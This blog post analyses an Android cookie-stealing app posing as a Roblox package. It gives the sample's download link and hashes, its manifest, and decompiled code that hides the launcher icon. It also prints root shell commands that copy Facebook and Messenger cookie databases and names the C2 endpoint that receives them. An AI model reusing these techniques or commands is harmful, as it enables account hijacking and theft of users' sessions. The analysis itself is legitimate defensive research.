---
title: Cookiethief Malware Analysis
date: 2023-05-31
subtitle: 
tags: [android,malware,mobile]
comments: true
---
In this post, I will provide an in-depth technical analysis of a malicious android application that steals cookies from the browser and sends them to a C2 server.

## APK Metadata
---
`Malware sample`: [here](https://github.com/sk3ptre/AndroidMalware_2020/raw/master/mar_CookieStealer.zip)
<br>
`MD5`: 65a92baefd41eb8c1a9df6c266992730
<br>
`SHA256`: 60df17a8d53bf179c5025baf9b0fbfc9bdc4cfb483b059ab2c58bfdf375c8c76
<br>
`SHA1`: 117a2bdb1550534c0945dd210c2e9b1e58c50431
<br>
`File Size`: 124 KB
<br>
`CRC32`: 05cfb82d
<br>
`Package Name`: com.lob.roblox

---

## Android Manifest
```xml
<?xml version="1.0" encoding="utf-8" standalone="no"?><manifest xmlns:android="http://schemas.android.com/apk/res/android" package="com.lob.roblox" platformBuildVersionCode="22" platformBuildVersionName="5.1.1-1819727">
    <uses-permission android:name="android.permission.WRITE_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.ACCESS_WIFI_STATE"/>
    <uses-permission android:name="android.permission.INTERNET"/>
    <uses-permission android:name="android.permission.READ_PHONE_STATE"/>
    <uses-permission android:name="android.permission.READ_EXTERNAL_STORAGE"/>
    <uses-permission android:name="android.permission.MOUNT_UNMOUNT_FILESYSTEMS"/>
    <application android:allowBackup="true" android:icon="@drawable/ic_launcher" android:label="@string/app_name" android:theme="@style/AppTheme">
        <activity android:label="@string/app_name" android:name=".MainActivity">
            <intent-filter>
                <action android:name="android.intent.action.MAIN"/>
                <category android:name="android.intent.category.LAUNCHER"/>
            </intent-filter>
        </activity>
        <service android:enabled="true" android:name="com.lob.roblox.TaskService">
            <intent-filter android:priority="1000">
                <action android:name="com.lob.roblox"/>
            </intent-filter>
        </service>
    </application>
</manifest>
```
So, there's one activity `MainActivity` and one service `TaskService`. The app can also request permissions to read data from the storage, write to external storage, access the internet,etc.

## Reverse Engineering
Decompiling the application using the JADX decompiler, we get the following code from `com.lob.roblox.MainActivity`
```java
public class MainActivity extends Activity {
    @Override // android.app.Activity
    protected void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(R.layout.activity_main);
        startService(new Intent(this, TaskService.class));
        iconHide();
    }

    private void iconHide() {
        PackageManager packageManager = getPackageManager();
        ComponentName componentName = getComponentName();
        packageManager.setComponentEnabledSetting(componentName, 2, 1);
        finish();
    }
}
```
The `TaskService` is started as soon as the application is run and then it calls a function `iconHide()` which further calls the `setComponentEnabledSetting` function with three arguments. The second argument represents new state whose value is `2` (COMPONENT_ENABLED_STATE_DISABLED) and the third argument represents flags which is `1` (DONT_KILL_APP). This is used to hide the app icon.

![](/images/rev/roblox-1/roblox-1.png)
It creates a new instance of the `RobloxUtils` class and calls its `start()` method. Let's have a look on the decompiled code of this class.

![](/images/rev/roblox-1/roblox-2.png)
Here, we can see two calls to the `doCmd` function at the start of the function `start()`.

![](/images/rev/roblox-1/roblox-3.png)

Here, the values of `cmd1` and `cmd12` are:
```
cp /data/data/com.facebook.orca/app_webview/Cookies /data/data/com.lob.roblox/files/CookiesFbOrca
```
and
```
cp /data/data/com.facebook.katana/app_webview/Cookies /data/data/com.lob.roblox/files/CookiesFbKatana
```
respectively. These commands are run on the device by calling a native function `runRoodCmd`. After that it runs `chmod 777` to make these files accessible by everyone and calls `zipAllConfigFile` to store all these files within a single zip file.

![](/images/rev/roblox-1/roblox-4.png)
The zip file is stored at the path `/data/data/com.lob.roblox/files/file.zip`. After that, it sends a post request to `https://api-resource.youzicheng.net/api/resource/uploadFacebookCookie` with form data as the androidId, channelId and the zip file.

